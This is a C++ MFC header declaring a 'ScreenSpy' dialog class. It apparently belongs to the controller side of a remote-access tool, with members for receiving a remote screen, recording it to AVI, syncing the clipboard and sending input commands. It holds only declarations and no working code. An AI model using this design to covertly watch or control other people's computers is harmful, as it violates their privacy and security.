#if !defined(AFX_SCREENSPYDLG_H__5B2E11A7_9FB5_45A2_BC52_E7FE25743540__INCLUDED_)
#define AFX_SCREENSPYDLG_H__5B2E11A7_9FB5_45A2_BC52_E7FE25743540__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// ScreenSpyDlg.h : header file
//
#include "CursorInfo.h"
#include "BmpToAvi.h"
/////////////////////////////////////////////////////////////////////////////
// CScreenSpyDlg dialog


class CScreenSpyDlg : public CDialog
{
// Construction
public:
	void OnReceiveComplete();
	void OnReceive();
	CScreenSpyDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // standard constructor

// Dialog Data
	//{{AFX_DATA(CScreenSpyDlg)
	enum { IDD = IDD_DIALOG_SCREENSPY };
		// NOTE: the ClassWizard will add data members here
	//}}AFX_DATA

// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CScreenSpyDlg)
	public:
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	virtual void PostNcDestroy();
	//}}AFX_VIRTUAL

// Implementation
protected:
	BOOL m_bOnClose;
	// Generated message map functions
	//{{AFX_MSG(CScreenSpyDlg)
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnClose();
	afx_msg void OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar);
	afx_msg void OnVScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar);
	afx_msg void OnPaint();
	afx_msg void OnTimer(UINT nIDEvent);
	//}}AFX_MSG

	DECLARE_MESSAGE_MAP()
private:
	HICON m_hIcon;
	void InitMMI();
	MINMAXINFO m_MMI;
	void DrawTipString(CString str);
	HDC m_hDC, m_hMemDC;
	HBITMAP	m_hFullBitmap;
	LPVOID m_lpScreenDIB;

	CString m_aviFile; // 录像文件名。如果文件名不为空就写入
	CBmpToAvi	m_aviStream;

	LPBITMAPINFO m_lpbmi, m_lpbmi_rect;
	UINT m_nCount;
	UINT m_HScrollPos, m_VScrollPos;
	HCURSOR	m_hRemoteCursor;
	DWORD	m_dwCursor_xHotspot, m_dwCursor_yHotspot;
	POINT	m_RemoteCursorPos;
	BYTE	m_bCursorIndex;
	CCursorInfo	m_CursorInfo;
	void ResetScreen();
	void DrawFirstScreen();
	void DrawNextScreenDiff();	// 差异法
	void DrawNextScreenRect();	// 隔行扫描法
	void SendResetScreen(int nBitCount);
	void SendResetAlgorithm(UINT nAlgorithm);
	bool SaveSnapshot();
	void UpdateLocalClipboard(char *buf, int len);
	void SendLocalClipboard();
	int	m_nBitCount;
	bool m_bIsFirst;
	bool m_bIsTraceCursor;
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	CString m_IPAddress;
	bool m_bIsCtrl;
	void SendNext();
	void SendCommand(MSG* pMsg);
	LRESULT OnGetMiniMaxInfo(WPARAM, LPARAM);

};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_SCREENSPYDLG_H__5B2E11A7_9FB5_45A2_BC52_E7FE25743540__INCLUDED_)
